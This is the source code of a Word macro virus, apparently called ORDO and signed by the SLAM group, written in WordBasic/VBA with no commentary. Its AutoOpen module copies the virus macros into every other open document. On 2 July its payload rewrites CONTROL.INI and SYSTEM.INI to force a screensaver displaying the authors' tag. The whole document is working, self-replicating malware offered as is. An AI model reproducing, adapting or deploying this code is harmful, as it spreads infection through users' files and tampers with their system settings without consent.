   Attribute VB_Name = "ORDO"

   Private Declare Function GetWindowsDirectoryA Lib "Kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

   Public Sub MAIN()
   Dim Windir$
   Dim nSize
   Dim WordLong
   Dim IniName$
   Dim a$
   Dim b$
   Dim c$
   Windir$ = String(255, " "): nSize = 255
   WordLong = GetWindowsDirectoryA(Windir$, nSize)
   IniName$ = Windir$ + "\" + "CONTROL.INI"
   a$ = "O.R.D.O  NJ [SLAM]"
   b$ = Windir$ + "\SYSTEM\MARQUEE.SCR"
   c$ = Windir$ + "\SYSTEM.INI"
   WordBasic.SetPrivateProfileString "HKEY_CURRENT_USER\Control Panel\desktop", "ScreenSaveTimeOut", "60", ""
   WordBasic.SetPrivateProfileString "HKEY_CURRENT_USER\Control Panel\desktop", "ScreenSaveActive", "60", ""
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Text", a$, IniName$
   WordBasic.SetPrivateProfileString "boot", "SCRNSAVE.EXE", b$, c$
   End Sub

   Attribute VB_Name = "aUtOoPeN"

   Public Sub MAIN()
   Dim InfectedFile$
   Dim ORDO
   Dim NewFile$
   Dim a$
   Dim a_
   WordBasic.ScreenUpdating
   WordBasic.DisableAutoMacros
   InfectedFile$ = WordBasic.[FileName$]()
   For ORDO = 1 To WordBasic.CountFiles()
   If WordBasic.[Files$](WordBasic.[FileName$](ORDO)) <> "" Then
       WordBasic.FileList ORDO
       NewFile$ = WordBasic.[FileName$]()
       If InfectedFile$ <> NewFile$ Then
           If VI = 0 Then
               WordBasic.FileSaveAs Format:=1
               WordBasic.MacroCopy InfectedFile$ + ":aUtOoPeN", NewFile$ + ":"
               WordBasic.MacroCopy InfectedFile$ + ":ORDO", NewFile$ + ":"
           End If
       WordBasic.FileClose 1
       End If
   End If
   Next
   a$ = WordBasic.[AppInfo$](2): a$ = WordBasic.[Left$](a$, 1): a_ = WordBasic.Val(a$)
   If a_ = 7 Then
       If WordBasic.Day(WordBasic.Now()) = 2 And WordBasic.Month(WordBasic.Now()) = 7 Then
           ORDO
       End If
   End If
   WordBasic.DisableAutoMacros 0
   End Sub

   Private Function VI()
   Dim i
   VI = 0
   If WordBasic.CountMacros(1) > 0 Then
       For i = 1 To WordBasic.CountMacros(1)
           If WordBasic.[MacroName$](i, 1) = "ORDO" Then
               VI = 1
           End If
       Next i
   End If
   End Function
